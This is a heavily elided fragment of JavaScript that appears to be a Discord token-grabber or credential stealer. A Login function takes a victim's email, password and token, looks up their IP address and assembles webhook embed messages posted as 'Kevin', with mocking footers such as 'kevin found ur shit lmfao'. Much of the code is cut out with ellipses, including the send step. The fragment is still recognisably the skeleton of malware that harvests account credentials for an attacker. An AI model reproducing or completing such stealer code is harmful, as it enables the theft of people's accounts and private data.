  ...
  function Login(email, password, token) {
    ...
    `, true).then((ip) => {
        ...
        var params = {
            username: "Kevin",
            content: "",
            avatar_url: "https://i.pinimg.com/originals/dd/10/bc/dd10bc691cc43f867b225620846d84d4.jpg",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                    ...
                    "footer": {
                        "text": "bro you just got rked by kevin"
                    }
                }
            ]
        }
            ...
            embeds: [
                {
                    ...
                    "footer": {
                        "text": "kevin found ur shit lmfao"
                    }                
                }
            ]
        }
            ...
            embeds: [
                {
                    ...
                    "footer": {
                        "text": "kevin just found ur shit lol"
                    }
                }
            ]
        }
